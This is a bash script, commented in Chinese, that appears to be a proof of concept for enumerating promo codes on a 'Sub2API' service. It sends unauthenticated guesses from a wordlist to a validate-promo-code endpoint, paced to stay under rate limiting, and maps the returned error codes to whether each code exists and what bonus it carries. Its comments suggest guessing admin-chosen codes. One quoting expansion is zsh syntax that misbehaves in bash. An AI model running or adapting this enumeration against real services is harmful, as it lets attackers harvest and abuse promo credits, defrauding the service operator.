#!/usr/bin/env bash
# Sub2API 优惠码存在性 oracle —— 零凭证，按 error_code 分级判读
# 用法: bash sub2api_promo_code_oracle.sh codes.txt
# 限速: 7s/条（标称 10/分，实测 25 连发不触发 429）

TARGET="${TARGET:-https://target485.example.com}"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/192.0.2.4 Safari/537.36"
DICT="${1:-codes.txt}"
CURL="curl -sS -k --noproxy * -A ${UA:Q} -m 10"

post() {  # $1 = code (may be empty)
  $CURL -D /tmp/_h -X POST "$TARGET/api/v1/auth/validate-promo-code" \
        -H 'Content-Type: application/json' \
        --data-binary "$(printf '{"code":"%s"}' "$1")"
  echo "  [http] $(head -1 /tmp/_h | tr -d '\r')"
}

echo "=== [0] 功能开关探针（空 code）==="
post ""
# 400 + Field validation for 'Code' failed on the 'required' tag
#   => enabled 检查在 binding 之前通过，请求已进 DB 查询分支
# DISABLED 类返回 => 功能关闭，本条不成立

echo "=== [1] 逐条判读（7s 间隔）==="
while IFS= read -r c; do
  [ -z "$c" ] && continue
  echo "--- code=$c"
  post "$c"
  sleep 7
done < "$DICT"

# ---------------------------------------------------------------
# 判读表（源码分支 auth_handler.go:498-520）：
#   PROMO_CODE_NOT_FOUND  码不存在
#   PROMO_CODE_DISABLED   码存在但被停用
#   PROMO_CODE_EXPIRED    码存在但过期
#   PROMO_CODE_MAX_USED   码存在但达使用上限
#   PROMO_CODE_ALREADY_USED 该码已被当前用户用过（需登录态）
#   valid:true + data.bonus_amount  命中，直接回显面额
#
# 码空间：8 字节随机 hex（16 位，16^16）=> 穷举不可行，
# 只打管理员自定义短码/语义码（WELCOME / 品牌名 / 年份 / 活动名）。
#
# 证据留存格式（实测）：
#   POST /api/v1/auth/validate-promo-code {"code":""}
#   -> 400 {"code":400,"message":"Invalid request: Key: 'ValidatePromoCodeRequest.Code' ..."}
#   25 个猜测全部 200 {"code":0,"message":"success","data":{"valid":false,"error_code":"PROMO_CODE_NOT_FOUND"}}
# ---------------------------------------------------------------
